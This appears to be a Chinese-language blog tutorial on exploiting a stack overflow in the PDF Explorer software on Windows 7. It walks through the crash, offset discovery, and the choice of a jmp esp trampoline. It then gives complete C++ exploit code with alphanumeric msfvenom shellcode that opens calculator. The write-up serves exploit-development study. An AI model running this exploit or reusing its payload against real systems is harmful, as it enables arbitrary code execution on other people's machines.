## 一、漏洞简介

这是一个栈溢出漏洞，一个叫PDF Explorer的软件（干嘛的咱没必要知道），他对于用户输入内容长度没有限制造成栈溢出漏洞。

## 二、漏洞环境

虚拟机

|

目标程序

|

调试器  
  
---|---|---  
  
win7x86

|

PDF Explorer

|

x32dbg、OD  
  
## 三、漏洞利用

### 1、漏洞测验

首先安装软件，然后打开：

![](https://image.3001.net/images/20221214/1671002690_63997a420ebb4996ef29c.png!small)

点击数据库：

![](https://image.3001.net/images/20221214/1671002691_63997a43176ac1799533e.png!small)

点击自定义域设置：

![](https://image.3001.net/images/20221214/1671002692_63997a440d8a7500985ef.png!small)

目标输入框如下：

![](https://image.3001.net/images/20221214/1671002693_63997a4524799dec83a07.png!small)

我们测试输入，一直输入1，嘎嘎快乐：

![](https://image.3001.net/images/20221214/1671002694_63997a4673d819dea4f1b.png!small)

## 2、检测溢出点

整奔溃了，咱利用kali中pattern_create生成字符串，用来定位溢出点：![](https://image.3001.net/images/20221214/1671002695_63997a472fb50e4cd5e99.png!small)

Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8AAn0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2B

复制粘贴上文字符串，使用x32dbg打开PDF Explorer，运行：

![](https://image.3001.net/images/20221214/1671002695_63997a47e958fd637810e.png!small)

![](https://image.3001.net/images/20221214/1671002696_63997a48f1705a8c91c8c.png!small)

观察x32dbg，按一下F9，让程序跑，观察EIP，找到溢出点：

![](https://image.3001.net/images/20221214/1671002697_63997a49ce9e8487e3868.png!small)

EIP是：396A4138  
即在396A4138处溢出，在这块截断字符串(注意小端序)：

Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9

## 3、漏洞利用

找到溢出点，我们开始分析堆栈情况，重新启动程序：

![](https://image.3001.net/images/20221214/1671002698_63997a4aba03edec0c76e.png!small)

连续三个F9，回到PDF中，数据库->自定义域：

![](https://image.3001.net/images/20221214/1671002699_63997a4b9787b799e8a85.png!small)

输入我们之前截断的字符串：

![](https://image.3001.net/images/20221214/1671002700_63997a4c5dacde1f27c2f.png!small)

观察此时的堆栈：  
ESP指向我们的shellcode中的一部分；  
ESP：0022E36C；  
而溢出点就在ESP+C的位置；

![](https://image.3001.net/images/20221214/1671002701_63997a4d290071ace32df.png!small)

在这里我们需要知道，ret之后eip指向esp的值，  
也就是关键call返回必定是一个ret C，让ESP指向396A4138，继续运行,可以看到溢出点依旧是396A4138：

![](https://image.3001.net/images/20221214/1671002701_63997a4dd47c3fa743f5c.png!small)

如果在这里我们上下找一下，确实可以找到一个ret c，哈哈哈，下断点测试一下确实是这里：

![](https://image.3001.net/images/20221214/1671002702_63997a4ec0aef33946c96.png!small)

前面这步操作无伤大雅，接下来就是构造shellcode了，我们的shellcode肯定在栈中，需要在溢出点那边跳到shellcode中，栈中地址都以00开头，所以不能直接跳转，经过构思，我们可以搞一个jmp
esp的跳板，放在溢出点，跳到自身溜下去执行我们的shellcode。shellcode由三部分组成，前一部分无所谓，别放00就行，溢出点放一个跳板地址jmp
esp，跳板后面跟我们的弹框shellcode。  
跳板指令我是又用OD附加PDF搜索jmp
esp找到一个地址76E277F1，弹窗shellcode用了msfvenom生成纯字符串弹个计算机（如果不是纯字符串，打印不出来）：

![](https://image.3001.net/images/20221214/1671002704_63997a5064d698f102485.png!small)

下面是exp：

#define _CRT_SECURE_NO_WARNINGS  
#include  
#include  
const char* a =
"TYIIIIIIIIIIIIIIII7QZjAXP0A0AkAAQ2AB2BB0BBABXP8ABuJI9lixLBs0s0S0U0nim56QKpSTnkPPP0lKsb4LNksbr4lKbRFH4OoGrj7VFQYoLlgLPa1lTB4lepZahO6m5QjgZBXrf2rwnkrrFpNkRjGLnk2lDQd8ZCw831xQ0QLKv9q0gqkcNkqYdX8cvZQYLKdtnk7qHVdqIollKqHOtM31hGTxYpSEZV4CsMyh5kama4D5KTQHLKf84d31HSU6LKdLPKNkqHWls1yCnkTDnk6a8PlI3tUt6DckckQqqICjcaIoIpaOco3jnk5BXknm3mpjeQlMnelrc0wpwprpRHEaNk2OOwkO8UOKjPluORCfE8LfNuoMMMIo9EgLwv3LdJK0Ikm0D535MkaWb3T2poPjgpv3yojuBC51RLcSDn2E2XPeGpAA";  
char buffer[2000] = { 0 };  
int main()  
{  
// 构造payload  
memset(buffer, 'A', 264);  
const char* payload =  
"\xF1\x77\xE2\x76" //jmp esp  
"\x90\x90\x90\x90"  
"\x90\x90\x90\x90"  
"\x90\x90\x90\x90";  
strcat(buffer, payload);  
strcat(buffer, a);  
  
// 写入文件  
std::ofstream o;  
o.open("poc.txt", std::ios::out | std::ios::trunc);  
o << buffer << std::endl;  
  
// 关闭文件  
o.close();  
return 0;  
}

输入到文件中的内容如下：

AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA駑鈜悙悙悙悙悙悙TYIIIIIIIIIIIIIIII7QZjAXP0A0AkAAQ2AB2BB0BBABXP8ABuJI9lixLBs0s0S0U0nim56QKpSTnkPPP0lKsb4LNksbr4lKbRFH4OoGrj7VFQYoLlgLPa1lTB4lepZahO6m5QjgZBXrf2rwnkrrFpNkRjGLnk2lDQd8ZCw831xQ0QLKv9q0gqkcNkqYdX8cvZQYLKdtnk7qHVdqIollKqHOtM31hGTxYpSEZV4CsMyh5kama4D5KTQHLKf84d31HSU6LKdLPKNkqHWls1yCnkTDnk6a8PlI3tUt6DckckQqqICjcaIoIpaOco3jnk5BXknm3mpjeQlMnelrc0wpwprpRHEaNk2OOwkO8UOKjPluORCfE8LfNuoMMMIo9EgLwv3LdJK0Ikm0D535MkaWb3T2poPjgpv3yojuBC51RLcSDn2E2XPeGpAA

之后打开PDF，按照之前步骤，把前面字符串复制到输入框中，程序退出，弹出计算机：

![](https://image.3001.net/images/20221214/1671002706_63997a52289989af03f44.png!small)

  

